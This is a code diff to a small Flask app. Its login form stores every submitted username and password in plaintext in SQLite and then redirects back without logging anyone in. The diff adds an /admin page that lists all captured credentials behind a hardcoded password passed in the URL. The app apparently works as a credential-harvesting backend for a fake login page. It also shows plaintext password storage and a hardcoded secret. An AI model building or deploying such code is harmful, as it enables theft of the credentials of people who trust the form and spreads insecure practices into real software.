@@ -1,9 +1,9 @@
-from flask import Flask, render_template, request, redirect
+from flask import Flask, render_template, request, redirect, url_for
 import sqlite3
 
 app = Flask(__name__)
 
-# Create the database table (runs only once)
+# Create the database table
 def init_db():
     conn = sqlite3.connect("logins.db")
     c = conn.cursor()
@@ -17,7 +17,7 @@ def init_db():
     conn.commit()
     conn.close()
 
-init_db()  # initialize DB at app start
+init_db()
 
 @app.route("/", methods=["GET", "POST"])
 def login():
@@ -25,16 +25,30 @@ def login():
         username = request.form.get("username")
         password = request.form.get("password")
 
-        # Save to SQLite DB
+        # Save to DB
         conn = sqlite3.connect("logins.db")
         c = conn.cursor()
         c.execute("INSERT INTO logins (username, password) VALUES (?, ?)", (username, password))
         conn.commit()
         conn.close()
 
-        return redirect("/")  # refresh
+        return redirect("/")
 
     return render_template("index.html")
 
-if __name__ == "__main__":
-    app.run()
+
+# 🔐 ADMIN PAGE
+@app.route("/admin")
+def admin():
+    # Set your secret admin password here
+    secret = request.args.get("password")
+    if secret != "neeladmin123":  # You can change this
+        return "Access Denied", 403
+
+    conn = sqlite3.connect("logins.db")
+    c = conn.cursor()
+    c.execute("SELECT username, password FROM logins")
+    data = c.fetchall()
+    conn.close()
+
+    return render_template("admin.html", data=data)
